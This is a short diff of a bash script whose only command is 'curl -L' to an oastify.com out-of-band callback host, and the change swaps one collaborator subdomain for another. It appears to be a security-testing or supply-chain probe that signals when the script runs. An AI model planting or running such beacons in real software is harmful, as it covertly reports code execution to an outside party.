@@ -1,3 +1,3 @@
 #!/bin/bash
 
-curl -L army.srn2pw586rg08eofopxf8fjit9z0nqbf.oastify.com
+curl -L armysick.nrixpr536mgv89oaokxa8ajdt4zvnmbb.oastify.com
